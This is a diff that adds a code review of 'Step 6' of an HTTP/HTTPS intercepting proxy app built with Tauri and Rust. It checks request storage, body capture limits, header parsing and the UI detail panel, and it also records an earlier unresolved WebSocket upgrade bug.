+**Step 5 is NOT clear.** The WebSocket upgrade request is not forwarded to the upstream server, causing a protocol error. The proxy sends a 101 response to the browser without contacting the upstream server about the upgrade. This will cause WSS connections to fail or malfunction. This must be fixed before the step passes.
+
+---
+
+## Step 6 Review
+
+**Reviewer:** Richard
+**Date:** 2026-04-15
+**Ready for Builder:** YES
+
+---
+
+### Must Fix
+
+None.
+
+---
+
+### Should Fix
+
+#### 1. `proxy.rs:1460-1461` — `get_request_detail` is dead code
+
+The Tauri command `get_request_detail(id)` is implemented and registered in `lib.rs:37`, but the frontend never calls it. The detail panel uses `selectedRequest` directly from the `intercepted-request` event payload (App.tsx lines 312-394). The command retrieves from `REQUEST_STORE` which is populated correctly, but nothing consumes it.
+
+This is not a bug — the panel works because the event payload contains all fields. However, the command exists without purpose. If `REQUEST_STORE` is ever cleared (it is not currently), the panel would still show stale data from the event payload.
+
+**Recommendation:** Either wire `get_request_detail` into the panel's tab switching (call it when switching to Headers or Body tab to get the latest data), or remove it. For now, this is minor.
+
+---
+
+### Escalate to Architect
+
+None.
+
+---
+
+### Cleared
+
+1. **REQUEST_STORE thread safety (proxy.rs:38-39, 199-201, 1066-1067, 1164-1165)** — `LazyLock<DashMap<String, InterceptedRequest>>` is correctly used for global concurrent storage. `store_request(req.clone())` is called BEFORE `emit("intercepted-request", ...)` in both the HTTPS CONNECT blind relay path (line 1066) and the HTTP path (line 1164). DashMap's internal locking handles concurrent access between the Tauri main thread and tokio workers. `get_request_detail` clones on return. All correct.
+
+2. **Body capture — 10KB cap and UTF-8 fallback (proxy.rs:151-160, 189-195)** — `decode_body` truncates to `MAX_BODY_SIZE` (10 * 1024) before calling `String::from_utf8`. If UTF-8 fails, falls back to `[Binary N bytes]`. Empty body results in `None` (shown as "(no body)" in UI). In `handle_http` (line 1140), `extract_response_body` is applied before `decode_body` via `.map()`. All correct.
+
+3. **Header parsing (proxy.rs:163-186, 141-148)** — `parse_response_headers` finds `\r\n\r\n` boundary via `data.windows(4).position(...)`, splits header block by `\n`, trims trailing `\r` from each line, extracts `name: value` pairs using `String::from_utf8_lossy` for safe conversion, and calls `format_headers` to produce `"Name: value\r\n..."` format. Returns `None` if no `\r\n\r\n` found. Correct.
+
+4. **`get_request_detail` lookup (proxy.rs:1460-1461)** — Returns `REQUEST_STORE.get(&id).map(|entry| entry.value().clone())`. Correctly returns `Option<InterceptedRequest>` with a cloned copy.
+
+5. **UI detail panel — three tabs and close behavior (App.tsx:312-394, App.css:533-639)** — Detail panel renders with three tabs (General/Headers/Body), tab switching via `detailTab` state, overlay click handler `onClick={() => setSelectedRequest(null)}` closes the panel, panel `onClick={(e) => e.stopPropagation()}` prevents close when clicking inside, close button calls `setSelectedRequest(null)`. CSS: `.detail-panel-overlay` is fixed positioning with flex-end alignment (slides in from right). `.detail-tab.tab-active` uses `color: #0071e3; border-bottom-color: #0071e3`. All correct.
+
+6. **No regression in request event emission (proxy.rs:1066-1067, 1164-1165)** — In both the HTTPS CONNECT blind relay path and HTTP path, `store_request(req.clone())` is called before `ctx.app_handle.emit("intercepted-request", &req)`. The `InterceptedRequest` struct fields are all populated before storage. No existing request event emission is broken.
+
+---
+
+### Conclusion
+
+**Step 6 is clear.** All six focus areas pass. DashMap is used correctly with proper store-before-emit ordering, body capture respects the 10KB limit and UTF-8 fallback, header parsing handles the HTTP format correctly, `get_request_detail` correctly retrieves from the store, the UI panel has correct tab structure and close behavior, and no regression in existing request event emission. The `get_request_detail` command is unused by the frontend but is not causing any bug.
